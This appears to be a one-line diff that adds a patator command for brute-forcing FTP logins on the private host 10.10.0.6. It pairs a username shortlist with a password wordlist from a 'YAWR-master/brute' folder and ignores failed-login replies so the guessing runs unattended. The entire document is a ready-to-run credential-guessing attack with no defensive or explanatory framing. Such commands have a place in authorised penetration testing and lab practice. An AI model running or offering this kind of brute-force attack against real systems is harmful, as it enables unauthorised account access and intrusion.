@@ -1,0 +1,1 @@
+patator ftp_login host=10.10.0.6 user=FILE0 password=FILE1 0=YAWR-master/brute/usernames-shortlist.txt 1=YAWR-master/brute/passwords/realyBest.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
